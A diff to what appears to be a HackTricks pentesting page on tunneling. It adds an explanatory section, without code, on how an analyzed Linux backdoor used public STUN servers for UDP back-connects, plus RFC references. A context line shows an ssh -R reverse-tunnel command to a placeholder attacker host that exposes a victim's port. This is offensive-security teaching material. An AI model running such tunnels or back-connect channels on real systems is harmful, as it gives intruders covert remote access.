@@ -919,6 +919,12 @@ ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_p
 
 The above command publishes the victim's port **8080** as **attacker_ip:9000** using the stock OpenSSH client while `frps` provides the gateway.<sup>[[50]](#references)</sup>
 
+## STUN-assisted UDP back-connects
+
+STUN Binding requests sent from a UDP socket can reveal its server-reflexive IP address and port, while periodic traffic keeps the NAT binding alive. A public STUN server is not a relay for arbitrary control packets.<sup>[[60]](#references)</sup> An analyzed back-connect design retained the same UDP socket for a short control datagram, then used a *separate outbound TCP connection* to fetch and execute commands after the trigger arrived.<sup>[[59]](#references)</sup>
+
+To receive the controller's UDP packet, a design still needs to share the mapping with that controller and satisfy the NAT's filtering policy. Address- or port-dependent filtering may accept replies from the STUN server but drop packets from another endpoint.<sup>[[60]](#references)[[61]](#references)</sup> The analyzed backdoor's rendezvous path was not verified, so successful STUN replies alone do not prove that its control channel is reachable.<sup>[[59]](#references)</sup> For a separate protocol with explicit rendezvous and relay fallback, see [PPPP camera NAT traversal](../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md#nat-traversal-and-transport).
+
 ## Covert VM-based Tunnels with QEMU
 
 QEMU user-mode networking does not require root or administrator privilege for the virtual network, and `-netdev user,hostfwd=...` redirects TCP, UDP, or UNIX connections from the host to the guest.<sup>[[51]](#references)</sup> TrustedSec documented a Tiny Core QEMU VM and an attempted reverse SSH tunnel in an incident where host-focused EDR could miss activity inside the guest.<sup>[[1]](#references)</sup>
@@ -1068,5 +1074,8 @@ The same report details the defaults, wildcard listeners, packet decryption, rel
 - [56] [V-E-O/rdp2tcp](https://github.com/V-E-O/rdp2tcp)
 - [57] [Fortra Impacket - atexec.py](https://github.com/fortra/impacket/blob/master/examples/atexec.py)
 - [58] [NightEagle APT: GhostContainer and Tunneling](https://securelist.com/tr/nighteagle-apt-ghostcontainer-and-tunneling/121323/)
+- [59] [FortiGuard Labs - ClingSTUN Linux Backdoor Abuses Public STUN Infrastructure](https://www.fortinet.com/blog/threat-research/clingstun-linux-backdoor-abuses-public-stun-infrastructure)
+- [60] [RFC 8489 - Session Traversal Utilities for NAT (STUN)](https://www.rfc-editor.org/rfc/rfc8489.html)
+- [61] [RFC 4787 - NAT Behavioral Requirements for Unicast UDP](https://www.rfc-editor.org/rfc/rfc4787.html)
 
 {{#include ../banners/hacktricks-training.md}}
